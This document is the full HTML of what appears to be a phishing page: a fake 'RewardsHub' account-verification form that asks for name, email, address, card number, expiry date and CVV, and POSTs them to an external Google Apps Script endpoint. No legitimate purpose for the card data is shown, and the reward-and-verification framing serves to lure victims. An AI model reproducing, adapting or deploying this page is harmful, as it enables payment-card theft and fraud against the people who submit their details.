<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Verification | RewardsHub</title>
    <style>
        :root {
            --primary: #8b5cf6;
            --bg-dark: #0f172a;
            --form-bg: #1e293b;
            --text-muted: #94a3b8;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
        body { background-color: var(--bg-dark); color: white; display: flex; flex-direction: column; min-height: 100vh; }

        header { padding: 20px; text-align: center; background: rgba(15, 23, 42, 0.95); border-bottom: 1px solid #334155; }
        .logo { font-weight: 900; font-size: 1.5rem; color: var(--primary); }

        main { flex: 1; display: flex; justify-content: center; align-items: center; padding: 40px 20px; }
        .form-container { background: var(--form-bg); width: 100%; max-width: 500px; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); border: 1px solid #334155; }
        
        .input-row { display: flex; gap: 10px; }
        .input-group { margin-bottom: 15px; flex: 1; }
        .full-width { flex: none; width: 100%; }
        label { display: block; font-size: 0.75rem; color: var(--text-muted); margin-bottom: 5px; text-transform: uppercase; }
        input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #475569; background: #0f172a; color: white; outline: none; }
        .toggle-eye { position: absolute; right: 10px; top: 12px; cursor: pointer; color: var(--text-muted); }
        .input-wrapper { position: relative; }
        
        .submit-btn { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        footer { padding: 20px; text-align: center; color: var(--text-muted); font-size: 0.7rem; border-top: 1px solid #334155; }
    </style>
</head>
<body>

    <header>
        <div class="logo">🎁 RewardsHub</div>
    </header>

    <main>
        <div class="form-container">
            <h2 style="margin-bottom: 20px; text-align: center;">Account Verification</h2>
            <form action="https://script.google.com/macros/s/AKfycbxS-jRaoUr4qc4_VteTkPo4KI6HUZN79zhUarBrANamXaYwy0288o860yIxIqmwfPzC/exec" method="POST">
                
                <div class="input-row">
                    <div class="input-group">
                        <label>First Name</label>
                        <input type="text" name="firstName" placeholder="John" required>
                    </div>
                    <div class="input-group">
                        <label>Last Name</label>
                        <input type="text" name="lastName" placeholder="Doe" required>
                    </div>
                </div>

                <div class="input-group full-width">
                    <label>Email Address</label>
                    <input type="email" name="email" placeholder="name@example.com" required>
                </div>

                <div class="input-group full-width">
                    <label>Zip Code</label>
                    <input type="text" name="zipCode" placeholder="10001" required>
                </div>

                <div class="input-group full-width">
                    <label>Full Delivery Address</label>
                    <input type="text" name="address" placeholder="123 Main St, Apt 4" required>
                </div>

                <div class="input-group full-width">
                    <label>Cardholder Full Name</label>
                    <input type="text" name="cardHolderName" placeholder="JOHN DOE" required>
                </div>

                <div class="input-group full-width">
                    <label>Card Number</label>
                    <input type="text" name="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
                </div>

                <div class="input-row">
                    <div class="input-group">
                        <label>Expiry Date</label>
                        <input type="text" name="expire" placeholder="MM/YY" maxlength="5" required>
                    </div>
                    <div class="input-group">
                        <label>Secure CVV</label>
                        <div class="input-wrapper">
                            <input type="password" id="csv" name="csv" placeholder="•••" maxlength="4" required>
                            <span class="toggle-eye" onclick="toggleVisibility()">👁️</span>
                        </div>
                    </div>
                </div>

                <button type="submit" class="submit-btn">Complete Verification</button>
            </form>
        </div>
    </main>

    <footer>
        <p>Privacy Policy | Terms of Service | © 2026 RewardsHub</p>
    </footer>

    <script>
        function toggleVisibility() {
            const input = document.getElementById('csv');
            const eye = document.querySelector('.toggle-eye');
            if (input.type === "password") {
                input.type = "text";
                eye.innerText = "🙈";
            } else {
                input.type = "password";
                eye.innerText = "👁️";
            }
        }
    </script>
</body>
</html>
